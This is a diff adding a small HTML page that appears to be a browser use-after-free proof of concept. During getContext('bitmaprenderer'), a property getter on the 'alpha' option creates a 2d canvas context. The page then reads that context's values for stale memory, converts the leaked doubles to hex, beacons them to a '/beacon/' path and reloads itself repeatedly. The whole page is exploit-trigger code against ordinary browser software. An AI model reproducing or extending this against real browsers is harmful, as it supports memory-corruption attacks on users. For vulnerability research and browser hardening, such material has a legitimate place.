@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>VMIN</title></head>
+<body><pre id="out">VMIN — minimal UAF stale read</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var _i=[];for(var i=0;i<12;i++)_i.push(new Image());
+var _x=0;
+var _b=new ArrayBuffer(8),_f=new Float64Array(_b),_u=new Uint32Array(_b);
+function f2h(v){_f[0]=v;return ('00000000'+_u[1].toString(16)).slice(-8)+('00000000'+_u[0].toString(16)).slice(-8);}
+function bk(t,d){var m=_i[_x++];if(m)m.src='/beacon/VMIN-'+t+'?d='+encodeURIComponent(String(d).slice(0,500))+'&t='+Date.now();}
+
+bk('B','boot');
+
+var R=new Float64Array(6);
+var OK=[0,0,0,0,0,0];
+var canvas=document.createElement('canvas');
+canvas.width=1;canvas.height=1;
+var ctx=null;
+var opts={};
+Object.defineProperty(opts,'alpha',{get:function(){
+  ctx=canvas.getContext('2d');
+  ctx.lineWidth=42.42;
+  ctx.miterLimit=77.77;
+  ctx.globalAlpha=0.333;
+  return true;
+}});
+
+canvas.getContext('bitmaprenderer',opts);
+
+try{R[0]=ctx.lineWidth;OK[0]=1;}catch(e){OK[0]=-1;}
+try{R[1]=ctx.miterLimit;OK[1]=1;}catch(e){OK[1]=-2;}
+try{R[2]=ctx.globalAlpha;OK[2]=1;}catch(e){OK[2]=-3;}
+
+ctx=null;canvas=null;opts=null;
+
+var s='lw='+R[0]+'('+f2h(R[0])+')ok='+OK[0];
+s+='|ml='+R[1]+'('+f2h(R[1])+')ok='+OK[1];
+s+='|ga='+R[2]+'('+f2h(R[2])+')ok='+OK[2];
+bk('R',s);
+O.textContent='VMIN: '+s;
+bk('D','done');
+setTimeout(function(){location.reload();},15000);
+</script>
+</body></html>
